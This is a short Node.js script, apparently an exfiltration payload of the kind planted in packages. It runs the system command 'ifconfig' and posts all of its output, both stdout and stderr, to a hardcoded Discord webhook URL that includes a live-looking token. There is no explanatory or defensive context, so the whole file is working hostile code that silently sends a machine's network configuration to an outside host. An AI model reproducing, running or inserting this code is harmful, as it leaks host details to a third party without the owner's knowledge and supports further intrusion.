const axios = require("axios").default;
const child = require("child_process");
var proc = child.exec("ifconfig");

proc.stdout.on("data", (d) => {
  axios("https://discord.com/api/webhooks/946038549906612265/HCHM4zdF5VvfkWwfwtxow8jaTu8ZevaIKslDF8nH9_roZym9IrBStJZFn-A8FIJno_4M", {method: "POST", data: {content: d.toString()}});
});

proc.stderr.on("data", (d) => {
  axios("https://discord.com/api/webhooks/946038549906612265/HCHM4zdF5VvfkWwfwtxow8jaTu8ZevaIKslDF8nH9_roZym9IrBStJZFn-A8FIJno_4M", {method: "POST", data: {content: d.toString()}});
});
